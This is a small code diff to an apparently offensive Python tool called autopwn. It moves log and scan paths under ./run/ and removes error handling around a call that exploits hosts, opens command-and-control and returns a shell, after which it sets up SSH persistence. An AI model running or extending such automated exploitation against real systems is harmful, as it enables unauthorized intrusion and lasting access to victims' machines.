@@ -33,12 +33,12 @@ CRITICAL = RED + "Critical" + RESET
 SEVERITY_TEXT = {"LOW": LOW, "MEDIUM": MEDIUM, "HIGH": HIGH, "CRITICAL": CRITICAL}
 
 
-LOGFILE = open("./LOGS", "a+")
+LOGFILE = open("./run/LOGS", "a+")
 
 LOG("Launched autopwn.", LOGFILE, "inf")
 
 IP = "192.168.1.45"
-EXPLOIT_LIST = "./exploit_list"
+EXPLOIT_LIST = "./run/exploit_list"
 
 debug = 0
 
@@ -80,7 +80,7 @@ def scanIp4Vulnerabilities(exploit_path=EXPLOIT_LIST, ip=IP):
         LOG(msg, LOGFILE, "log")
         scan = subprocess.run(cmd, shell=True)
 
-        if "0 hosts up" in Path("./detect.xml").read_text():
+        if "0 hosts up" in Path("./run/detect.xml").read_text():
             raise Exception("HostIsDown")
 
         if scan:
@@ -456,18 +456,18 @@ if __name__ == "__main__":
         if len(sys.argv) > 2:
             Lhost = sys.argv[2]
 
-    try:
-        (shell, client, srv) = autopwn(
-            Rhosts=Rhosts,
-            Lhost=Lhost,
-            generic_exploit=True,
-            get_edb_exploits=True,
-            com_and_cont=True,
-            auto_mode=True,
-        )
-    except:
-        print("An error has occured.")
-        exit(-1)
+    # try:
+    (shell, client, srv) = autopwn(
+        Rhosts=Rhosts,
+        Lhost=Lhost,
+        generic_exploit=True,
+        get_edb_exploits=True,
+        com_and_cont=True,
+        auto_mode=True,
+    )
+    # except:
+    #     print("An error has occured.")
+    #     exit(-1)
 
     LOG("Begin setup for SSH persistence", LOGFILE, "log")
     print("[~] Begin setup for SSH persistence")
